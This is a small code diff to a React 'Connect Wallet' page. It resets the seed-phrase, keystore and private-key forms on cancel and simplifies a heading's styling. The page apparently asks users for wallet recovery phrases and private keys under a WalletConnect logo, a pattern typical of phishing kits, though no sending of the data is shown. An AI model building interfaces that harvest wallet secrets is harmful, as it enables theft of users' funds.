@@ -411,6 +411,9 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
           handleClick={() => {
             setShowConnectModal(false);
             setConnectIsLoading(false);
+            phraseFormik.resetForm();
+            keyStoreFormik.resetForm();
+            privateKeyFormik.resetForm();
           }}
         >
           cancel
@@ -761,16 +764,7 @@ const Wallets = () => {
           <Link to="/">
             <img src="/walletconnect.png" alt="logo" height={40} width={40} />
           </Link>
-          <h1
-            style={{
-              fontWeight: "600px",
-              fontSize: "2.5rem",
-              lineHeight: "0px",
-              marginBlock: "32px 8px",
-            }}
-          >
-            Connect Wallet
-          </h1>
+          <h1>Connect Wallet</h1>
           <h6 style={{ fontSize: "15px" }}>
             Please connect your wallet to continue
           </h6>
